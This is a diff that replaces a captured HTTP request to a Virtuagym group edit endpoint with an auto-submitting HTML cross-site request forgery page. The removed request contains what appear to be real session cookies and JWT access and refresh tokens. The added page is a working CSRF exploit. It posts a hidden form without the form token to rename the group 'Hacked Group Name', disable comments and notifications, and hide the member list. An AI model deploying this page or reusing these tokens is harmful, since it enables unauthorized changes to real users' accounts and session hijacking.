@@ -1,85 +1,33 @@
-POST /group/justus-hoke-portal/edit HTTP/2
-Host: geotheo06.github.io
-Cookie: virtuagym_u=33330468; vg-user-refresh-token=eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiI0NzkyNzE5Ni1jNjYxLTRhMWEtYmZkOC0zMmRlNDUxMzlkMzQiLCJpZGVudGl0eSI6eyJ1c2VyX2lkIjozMzMzMDQ2OCwiZ3JhbnRfdHlwZSI6InJlZnJlc2hfdG9rZW4iLCJzY29wZXMiOlt7ImF1dGhvcml0eSI6IlJPTEVfVVNFUiJ9XX0sInN1YiI6IjMzMzMwNDY4IiwiaXNzIjoidmlydHVhZ3ltLmNvbSIsImlhdCI6MTc3MTI3OTc3NSwiZXhwIjoxNzkyODc5Nzc1fQ.0gEn9lEjQ-sXZPqA41ohzVVSkU_xaUPE1AxBkiI2Dpw4VI31vbdWU3UfKlaSUUI6AuWxRgLuTpNQTTyOxnZkGQ; _BEAMER_USER_ID_xbnYKhOn25470=64f4a0c8-d8d0-4138-aad2-46480274b04c; _BEAMER_FIRST_VISIT_xbnYKhOn25470=2026-02-16T22:09:39.748Z; _BEAMER_DATE_xbnYKhOn25470=2026-01-31T20:44:31.000Z; _BEAMER_LAST_POST_SHOWN_xbnYKhOn25470=214955946; _ga_BYZHBEKQKT=GS2.2.s1772361003$o1$g0$t1772361003$j60$l0$h0; vg-user-access-token=eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJkYmYyNWM1Ni1hMGQ3LTRkN2QtYjA1ZC1iMDM2NzEzNTFkNDEiLCJpZGVudGl0eSI6eyJ1c2VyX2lkIjozMzMzMDQ2OCwiZ3JhbnRfdHlwZSI6ImFjY2Vzc190b2tlbiIsInNjb3BlcyI6W3siYXV0aG9yaXR5IjoiUk9MRV9VU0VSIn1dfSwiaXNzIjoidmlydHVhZ3ltLmNvbSIsImlhdCI6MTc3MjM2MTAwMywiZXhwIjoxNzcyMzYxOTAzfQ.T61mEa0B0r326xUYxRi5AIvI94gJXgoAmWwyJO-ENMdp4iP1tX2BVm7x59cFu2n8kFGIp0u9QthKTbEmKQQPuQ; virtuagym_k=e46c8f7c416e5671b5babc1ab8208b80e69b; virtuagym_sid=fc31b8d2b6ab01a76ceeb518b3c4498f4f0d; _gid=GA1.2.1344418201.1773994870; _BEAMER_LAST_PUSH_PROMPT_INTERACTION_xbnYKhOn25470=1773995967215; _BEAMER_FILTER_BY_URL_xbnYKhOn25470=false; _gat_UA-134508107-1=1; _BEAMER_FILTER_BY_URL_xbnYKhOn25470=false; _BEAMER_SOUND_PLAYED_xbnYKhOn25470=true; AWSALB=BNCPQFTugQ01adQYVowLs3cX8jw4K/GhuFqhQTsuIctb4FRVFKP5cftnlco0S6Q1QOkyQpudY7/G4+aFjOwcviwQPo0pJiaf+mn7gHZBBvjXxo00JYCrah25d7yk; AWSALBCORS=BNCPQFTugQ01adQYVowLs3cX8jw4K/GhuFqhQTsuIctb4FRVFKP5cftnlco0S6Q1QOkyQpudY7/G4+aFjOwcviwQPo0pJiaf+mn7gHZBBvjXxo00JYCrah25d7yk; _ga=GA1.1.255616078.1771279760; _ga_R1NVEY59ES=GS2.2.s1774081085$o5$g1$t1774081102$j43$l0$h0; _BEAMER_LAST_UPDATE_xbnYKhOn25470=1774081102887; _ga_W070GZ29XY=GS2.1.s1774081083$o8$g1$t1774081105$j38$l0$h0
-Content-Length: 1921
-Sec-Ch-Ua-Platform: "Windows"
-Accept-Language: en-US,en;q=0.9
-Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
-Sec-Ch-Ua-Mobile: ?0
-X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
-Accept: */*
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Origin: https://geotheo06.github.io
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: https://iamfitjustush.virtuagym.com/group/justus-hoke-portal/edit
-Accept-Encoding: gzip, deflate, br
-Priority: u=1, i
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack – Group Edit</title>
+</head>
+<body>
+    <h1>Group Settings Update</h1>
+    <p>Please wait...</p>
 
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="creation_time"
+    <form id="csrfForm" action="https://iamfitjustush.virtuagym.com/group/justus-hoke-portal/edit" method="POST" enctype="multipart/form-data">
+        <!-- All fields except form_token -->
+        <input type="hidden" name="creation_time" value="1774081100">
+        <input type="hidden" name="action" value="add_group">
+        <input type="hidden" name="message" value="">
+        <input type="hidden" name="path_existing_group_avatar" value="/images/default_portal_group_logo.png">
+        <input type="hidden" name="path_existing_group_header" value="/images/default_header.png">
+        <input type="hidden" name="form_group_name" value="Hacked Group Name">
+        <input type="hidden" name="message" value="This group was modified via CSRF">
+        <input type="hidden" name="group_lang" value="en">
+        <input type="hidden" name="group_avatar" value="/images/default_portal_group_logo.png">
+        <input type="hidden" name="group_header" value="/images/default_header.png">
+        <input type="hidden" name="only_admins_post" value="0">
+        <input type="hidden" name="allow_comments" value="0">
+        <input type="hidden" name="mail_when_message" value="0">
+        <input type="hidden" name="mail_when_comment" value="0">
+        <input type="hidden" name="hide_memberlist" value="1">
+    </form>
 
-1774081100
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="form_token"
-
-c5d15b6eb8a4f24bdf669303aaf48befc697c867
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="action"
-
-add_group
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="message"
-
-
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="path_existing_group_avatar"
-
-/images/default_portal_group_logo.png
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="path_existing_group_header"
-
-/images/default_header.png
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="form_group_name"
-
-I am Fit Portal
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="message"
-
-Dieser Kurs ist für alle, die Spaß an Bewegung haben.
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="group_lang"
-
-en
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="group_avatar"
-
-/images/default_portal_group_logo.png
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="group_header"
-
-/images/default_header.png
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="only_admins_post"
-
-0
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="allow_comments"
-
-1
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="mail_when_message"
-
-1
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="mail_when_comment"
-
-1
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6
-Content-Disposition: form-data; name="hide_memberlist"
-
-0
-------WebKitFormBoundaryr0KeUrH4WAy3hyH6--
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
